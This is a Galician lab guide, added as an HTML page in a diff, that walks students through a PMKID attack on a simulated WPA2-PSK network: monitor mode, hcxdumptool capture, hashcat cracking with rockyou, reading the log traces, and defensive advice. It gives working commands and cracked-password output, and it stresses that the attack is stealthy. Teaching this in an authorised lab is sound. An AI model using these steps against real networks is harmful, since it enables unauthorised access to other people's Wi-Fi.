@@ -1,0 +1,243 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Guía da práctica 1.4 — Captura PMKID en WPA2-PSK</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Guía da práctica 1.4 — Captura PMKID en WPA2-PSK</h1>
+<div class="notice note"><strong>Escenario e resultado da práctica</strong>
+<p>Empregamos o escenario <code>psk</code>, cun punto de acceso WPA2-PSK e un cliente asociado. Neste laboratorio comprobouse a captura dun PMKID e a recuperación do contrasinal con Hashcat. Noutros puntos de acceso o PMKID pode non estar dispoñible: verifícao na captura, sen confundir o rexistro <code>WPA*01</code> (PMKID) con <code>WPA*02</code> (EAPOL).</p>
+</div>
+<div class="notice important"><strong>Baseada na práctica [1-Taller-HE-Practica-WiFi-3.pdf](https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-3.pdf){:target=&quot;_blank&quot;}</strong>
+</div>
+<h2>1. Contexto</h2>
+<p>Nesta práctica aprenderás unha técnica moderna de auditoría WPA2-PSK que é <strong>moito menos intrusiva</strong> que o ataque de handshake tradicional. O PMKID é un identificador criptográfico que certos puntos de acceso poden incluír, por exemplo, na mensaxe EAPOL-Key M1. Cando se captura un PMKID válido, pódese comprobar a fortaleza do contrasinal sen forzar a desautenticación dun cliente lexítimo.</p>
+<p><strong>Vantaxes principais sobre <a href="1.1-ATAQUE_WPA2_PSK.html">Práctica 1.1</a>{:target=&quot;_blank&quot;}:</strong></p>
+<ul>
+<li><strong>NON require deautenticación</strong> → Cliente lexítimo NON se entera do ataque</li>
+<li>A captura <strong>pode completarse rapidamente</strong>, se o AP proporciona o PMKID</li>
+<li><strong>NON require capturar as catro mensaxes EAPOL</strong> se se obtén un PMKID válido</li>
+<li><strong>Moito menos intrusivo</strong> → Cliente mantén conexión activa</li>
+</ul>
+<p><strong>Nota técnica sobre clientes:</strong>
+A dispoñibilidade dun PMKID depende da implementación e da configuración do AP. Nesta práctica usamos <code>psk</code>, que inclúe un cliente lexítimo (<code>wlan1</code>) conectado. Esa é a topoloxía que se validou experimentalmente; a presenza dun cliente asociado non é un requisito universal do método PMKID.</p>
+<p><strong>Diferenza clave con <a href="1.1-ATAQUE_WPA2_PSK.html">Práctica 1.1</a>{:target=&quot;_blank&quot;}:</strong></p>
+<ul>
+<li>Práctica 1.1: <strong>Deautenticamos</strong> ao cliente → Cliente perde conexión</li>
+<li>Práctica 1.4: Cliente <strong>mantén conexión</strong> → Ataque silencioso ✓</li>
+</ul>
+<hr />
+<h2>2. Preparación do Escenario (Terminal 1)</h2>
+<p>Arranca o laboratorio para despregar o AP lexítimo (<code>EMPRESA-XYZ</code>) <strong>con cliente conectado</strong>.</p>
+<pre><code class="language-bash">sudo wifilabctl up psk
+sudo wifilabctl status
+</code></pre>
+<div class="notice warning"><strong>**Nota Importante sobre PMKID**</strong>
+<p>Aínda que o ataque PMKID <strong>non require que O ATACANTE sexa un cliente lexítimo</strong> (non necesita o contrasinal previamente), algúns APs <strong>só envían o PMKID cando hai polo menos unha asociación activa</strong> no AP. Por iso, nesta práctica:</p>
+<ul>
+<li><strong>Usamos o escenario <code>psk</code></strong> que ten un cliente lexítimo (wlan1) conectado</li>
+<li>O cliente lexítimo permite observar o comportamento do AP cunha asociación establecida</li>
+<li>O atacante (wlan2) envía Association Requests e recibe PMKID</li>
+<li><strong>NON precisamos deautenticar ao cliente</strong> (diferenza clave con Práctica 1.1)</li>
+<li><strong>NON precisamos capturar un 4-way handshake completo</strong> cando o PMKID está dispoñible</li>
+</ul>
+</div>
+<p><strong>Vantaxe sobre Práctica 1.1:</strong></p>
+<ul>
+<li>Práctica 1.1: Require <strong>deautenticación</strong> → Cliente perde conexión temporalmente</li>
+<li>Práctica 1.4: <strong>NON require deautenticación</strong> → Cliente NON se entera do ataque</li>
+</ul>
+<hr />
+<h2>3. Recoñecemento e Modo Monitor (Terminal 1)</h2>
+<p>Pon a túa tarxeta Wi-Fi de ataque (<code>wlan2</code>) en modo monitor.</p>
+<pre><code class="language-bash">sudo airmon-ng start wlan2
+sudo airodump-ng wlan2mon
+</code></pre>
+<p><em>Anota a Canle (6) do AP obxectivo (EMPRESA-XYZ).</em></p>
+<p>Preme <strong>Ctrl+C</strong> para deter airodump-ng.</p>
+<hr />
+<h2>4. Captura de PMKID (Terminal 1)</h2>
+<p>Usa <code>hcxdumptool</code> para capturar o PMKID directamente do AP.</p>
+<pre><code class="language-bash"># Crear directorio para capturas
+mkdir -p ~/capturas-pmkid
+cd ~/capturas-pmkid
+
+# Capturar PMKID do AP no canal 6
+sudo hcxdumptool -i wlan2mon -w captura_pmkid.pcapng -c 6a --rds=1
+</code></pre>
+<p><strong>Parámetros importantes:</strong></p>
+<ul>
+<li><code>-c 6a</code>: Canle 6 en modo activo, segundo a sintaxe de <code>hcxdumptool</code> empregada neste laboratorio</li>
+<li><code>--rds=1</code>: Mostrar estado en tempo real</li>
+</ul>
+<p><strong>Saída esperada durante a captura:</strong></p>
+<pre><code>CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID
+  6|13:55:00|ep+++ |1eb9fa94c722|9e7dc6f0151f|EMPRESA-XYZ
+</code></pre>
+<p><strong>Significado de <code>ep+++</code>:</strong></p>
+<ul>
+<li><code>e</code> = EAPOL capturado ✓</li>
+<li><code>p</code> = PMKID capturado ✓</li>
+<li><code>+++</code> = Boa calidade</li>
+</ul>
+<p>Cando vexas o indicador de PMKID, preme <strong>Ctrl+C</strong> para deter. O tempo de captura é variable; confirma posteriormente se se exportou un rexistro <code>WPA*01</code>.</p>
+<hr />
+<h2>5. Conversión a Formato hashcat (Terminal 1)</h2>
+<p>Converte o ficheiro capturado a formato que hashcat entende.</p>
+<pre><code class="language-bash"># Converter captura
+hcxpcapngtool -o captura_pmkid.hc22000 captura_pmkid.pcapng
+
+# Verificar que se xerou correctamente
+cat captura_pmkid.hc22000
+</code></pre>
+<p><strong>Exemplo dunha saída EAPOL (non PMKID):</strong></p>
+<pre><code>WPA*02*60d9443cc2379bd16ff29371e8aeea87*a6c49421b094*2e2e65aef8ed*454d50524553412d58595a*209c3cccbc531952b5351c647288ac30ca493f7c3aba497c6fb5de9642955dbb*0103007502010a0000000000000000f7b8949a7f3bd65f6f7d7e081f447056fee05f3f40ff2c4f8a24af6a37861d25ad8d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020000*10
+</code></pre>
+<p><em>O exemplo anterior é <code>WPA*02</code>: material EAPOL, non un rexistro PMKID. Un PMKID exportado utiliza o prefixo <code>WPA*01</code>.</em></p>
+<p><strong>Nota:</strong> O formato <a href="apuntamentos/modo-22000.html">22000</a>{:target=&quot;_blank&quot;} de Hashcat admite rexistros <code>WPA*01</code> (PMKID) e <code>WPA*02</code> (EAPOL). Para validar especificamente esta práctica, comproba que se exportou polo menos un <code>WPA*01</code>:</p>
+<pre><code class="language-bash">grep -c '^WPA\*01\*' captura_pmkid.hc22000
+</code></pre>
+<p>Se o resultado é <code>0</code>, podería haber material EAPOL utilizable, pero <strong>non está demostrada a captura dun PMKID</strong>.</p>
+<hr />
+<h2>6. Cracking con hashcat (Terminal 1)</h2>
+<p>Agora imos crackear o PMKID capturado.</p>
+<p><strong>Paso 1: Preparar o dicionario</strong></p>
+<pre><code class="language-bash"># Se Rockyou está comprimido, descomprímeo nun ficheiro temporal:
+if [ -f /usr/share/wordlists/rockyou.txt ]; then
+    cp /usr/share/wordlists/rockyou.txt /tmp/rockyou.txt
+else
+    gzip -dc /usr/share/wordlists/rockyou.txt.gz &gt; /tmp/rockyou.txt
+fi
+</code></pre>
+<p><strong>Paso 2: Lanzar o ataque</strong></p>
+<pre><code class="language-bash">hashcat -m 22000 captura_pmkid.hc22000 /tmp/rockyou.txt
+</code></pre>
+<p>Se o ataque ten éxito, verás:
+<strong>Status: Cracked</strong></p>
+<pre><code class="language-bash">60d9443cc2379bd16ff29371e8aeea87*a6c49421b094*2e2e65aef8ed*454d50524553412d58595a*...:spongebob19
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
+Time.Started.....: Sat Feb 14 13:57:25 2026 (21 secs)
+Speed.#01........:     4493 H/s
+Progress.........: 234139/14344385 (1.63%)
+</code></pre>
+<p><strong>Paso 3: Ver o contrasinal recuperado</strong></p>
+<pre><code class="language-bash">hashcat -m 22000 captura_pmkid.hc22000 /tmp/rockyou.txt --show
+</code></pre>
+<p><strong>Resultado esperado:</strong></p>
+<pre><code>60d9443cc2379bd16ff29371e8aeea87*a6c49421b094*2e2e65aef8ed*454d50524553412d58595a*...:spongebob19
+</code></pre>
+<p><strong>Contrasinal: spongebob19</strong> ✓</p>
+<hr />
+<h2>7. Comparación con Práctica 1.1 (Handshake Tradicional)</h2>
+<h3>Práctica 1.1 (Handshake 4-Way):</h3>
+<pre><code class="language-bash">1. airodump-ng (esperar por clientes)
+2. aireplay-ng (forzar deautenticación)
+3. Capturar 4 paquetes EAPOL (1/4, 2/4, 3/4, 4/4)
+4. aircrack-ng ou hashcat
+
+Tempo: Variable (minutos/horas)
+</code></pre>
+<h3>Práctica 1.4 (PMKID):</h3>
+<pre><code class="language-bash">1. hcxdumptool (captura activa en modo monitor)
+2. 1 paquete EAPOL con PMKID
+3. hashcat
+
+Tempo: variable, segundo a resposta do AP
+</code></pre>
+<p><strong>Conclusión:</strong> Cando o AP proporciona un PMKID, esta técnica permite evitar a desautenticación dun cliente lexítimo. A rapidez e a detectabilidade reais dependen do AP e das condicións da captura.</p>
+<hr />
+<h2>8. Observación Técnica</h2>
+<h3>Por que funciona PMKID?</h3>
+<p>O PMKID é un hash que o AP envía no primeiro paquete EAPOL:</p>
+<pre><code>PMKID = HMAC-SHA1-128(PMK, &quot;PMK Name&quot; || MAC_AP || MAC_STA)
+</code></pre>
+<p>Como deriva do <strong>PMK</strong> (Pairwise Master Key), igual que o handshake tradicional, permite auditar o contrasinal da mesma forma.</p>
+<h3>Por que usamos un cliente lexítimo conectado neste laboratorio?</h3>
+<p><strong>Explicación técnica:</strong></p>
+<ol>
+<li>En WPA2-PSK, a <strong>PMK</strong> deriva da PSK e do SSID.</li>
+<li>O PMKID identifícase a partir da PMK e dos enderezos MAC implicados no intercambio.</li>
+<li>A inclusión dun PMKID no intercambio depende da configuración e da implementación; <strong>non é universalmente necesario</strong> que outro cliente completase previamente un handshake.</li>
+<li>Neste laboratorio <code>wlan1</code> está conectado porque forma parte do escenario <code>psk</code> probado.</li>
+</ol>
+<p><strong>Secuencia:</strong></p>
+<pre><code>1. wlan1 (cliente) → Autentica con contrasinal → 4-way handshake completo
+2. AP e cliente derivan o material criptográfico da PSK e do SSID
+3. wlan2 (auditor) → Inicia o intercambio necesario para a captura
+4. AP → Pode incorporar o PMKID en EAPOL-Key
+5. `hcxpcapngtool` → Exporta `WPA*01` se o PMKID está presente
+6. Hashcat → Verifica candidatos do dicionario fronte ao rexistro capturado
+</code></pre>
+<h3>Limitacións</h3>
+<ol>
+<li><strong>Depende do AP e da súa configuración</strong>: non todos proporcionan un PMKID capturable</li>
+<li><strong>Mesmo esforzo de cracking</strong>: Contrasinais fortes (&gt;20 chars) son igual de resistentes</li>
+<li><strong>Rastro nos logs variable</strong>: a captura activa pode producir eventos de autenticación ou asociación detectables polo AP</li>
+</ol>
+<h3>Vantaxe Real sobre Práctica 1.1</h3>
+<p>Aínda que precisa cliente conectado, <strong>NON precisa deautenticalo</strong>:</p>
+<ul>
+<li>Práctica 1.1: Cliente <strong>perde conexión</strong> durante segundos → Detectable nos logs (<code>deauthentication</code>)</li>
+<li>Práctica 1.4: Cliente <strong>mantén conexión</strong> → Ataque sigiloso ✓</li>
+</ul>
+<hr />
+<h2>9. Verificación nos Logs (Opcional)</h2>
+<p>Podes examinar os logs do AP para entender o <strong>rastro real</strong> que deixa o ataque PMKID:</p>
+<pre><code class="language-bash"># Ver logs do AP - conexións rexistradas
+sudo ip netns exec wifi_ap_wlan0 grep &quot;AP-STA-CONNECTED\|associated&quot; /home/kali/wifiLab/run/psk/hostapd.log
+</code></pre>
+<p><strong>Resultado real que verás:</strong></p>
+<pre><code>wlan0: STA 2e:2e:65:ae:f8:ed IEEE 802.11: associated (aid 1)
+wlan0: AP-STA-CONNECTED 2e:2e:65:ae:f8:ed
+
+</code></pre>
+<p><strong>⚠️ Interpretación correcta dos logs:</strong></p>
+<p>No exemplo aparece unha MAC asociada; comproba se corresponde a <strong>wlan1</strong> (o cliente lexítimo) antes de atribuíla a outro equipo:</p>
+<pre><code class="language-bash"># Verificar que esa MAC pertence ao cliente lexítimo (wlan1)
+sudo ip netns exec wifi_cliente_wlan1 ip addr show wlan1
+</code></pre>
+<p>Se a MAC coincide, esa entrada corresponde a <code>wlan1</code>. Se aparecen outras MAC, investiga cada evento por separado.</p>
+<p><strong>Por que non aparece a MAC do atacante?</strong></p>
+<p><code>hcxdumptool</code> pode utilizar enderezos MAC temporais e intercambios breves, que non sempre quedan reflectidos como conexións completas. <strong>Isto non significa que o ataque sexa invisible</strong>: segundo a configuración, o AP pode rexistrar outros eventos de autenticación ou asociación.</p>
+<p>Isto é moi diferente da Práctica 1.1, onde a deautenticación deixa entradas claras e inconfundibles:</p>
+<pre><code># O que verías nos logs da Práctica 1.1 (NON desta práctica):
+wlan0: deauthentication: STA=xx:xx:xx:xx:xx:xx reason_code=7
+wlan0: Station xx:xx:xx:xx:xx:xx trying to deauthenticate, but it is not authenticated
+</code></pre>
+<p><strong>Conclusión sobre rastro forense:</strong></p>
+<p>| Ataque | Rastro en logs do AP | Detectabilidade |
+|--------|----------------------|-----------------|
+| Práctica 1.1 (deauth + handshake) | Entradas <code>deauthentication</code> explícitas | Alta ⚠️ |
+| Práctica 1.4 (PMKID) | Posibles eventos de autenticación e asociación | Depende dos rexistros do AP |</p>
+<p>A técnica PMKID pode evitar os eventos de desautenticación provocados, pero <strong>non garante ausencia de evidencias forenses</strong>. Cómpre revisar os logs reais e a captura.</p>
+<hr />
+<h2>10. Limpeza</h2>
+<p>Ao rematar, apaga o escenario.</p>
+<pre><code class="language-bash"># Saír primeiro do modo monitor
+sudo airmon-ng stop wlan2mon
+
+# Restablecer o laboratorio
+sudo wifilabctl reset
+
+# Eliminar capturas (opcional)
+rm -rf ~/capturas-pmkid
+</code></pre>
+<hr />
+<h2>Notas Finais</h2>
+<h3>Ferramentas Necesarias (xa instaladas en Kali)</h3>
+<ul>
+<li><code>hcxdumptool</code> &gt;= 7.0.0</li>
+<li><code>hcxpcapngtool</code> (parte de hcxtools)</li>
+<li><code>hashcat</code> (cunha plataforma OpenCL operativa; nesta VM utilízase PoCL)</li>
+</ul>
+<h3>Recomendacións de Seguridade</h3>
+<ol>
+<li><strong>Para administradores</strong>: Usar contrasinais fortes (&gt;20 caracteres aleatorios)</li>
+<li><strong>Migrar a WPA3-SAE</strong>: o intercambio SAE evita este tipo de comprobación pasiva directa de contrasinais a partir de PMKID/EAPOL (ver Práctica 3.1)</li>
+<li><strong>Activar PMF</strong>: Aínda que non protexe contra PMKID, dificulta outros ataques</li>
+</ol>
+<h3>Referencias</h3>
+<ul>
+<li><strong>Descobridor</strong>: Jens &quot;atom&quot; Steube (Agosto 2018)</li>
+<li><a href="https://hashcat.net/forum/thread-7717.html">Hashcat Forum - PMKID Attack</a></li>
+<li><a href="https://github.com/ZerBea/hcxdumptool">hcxdumptool GitHub</a></li>
+</ul>
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
